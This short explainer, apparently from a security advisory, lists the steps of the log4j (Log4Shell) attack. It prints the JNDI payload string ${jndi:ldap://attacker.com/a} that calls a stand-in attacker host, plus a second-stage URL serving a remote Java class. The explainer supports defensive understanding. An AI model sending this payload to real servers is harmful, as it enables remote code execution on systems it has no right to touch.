# Exploit Stepsâ€‹
* Data from the User gets sent to the server (via any protocol),
* The server logs the data in the request, containing the malicious payload: ${jndi:ldap://attacker.com/a} (where attacker.com is an attacker controlled server),
* The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via "Java Naming and Directory Interface" (JNDI),
* This response contains a path to a remote Java class file (ex. http://second-stage.attacker.com/Exploit.class) which is injected into the server process,
* This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
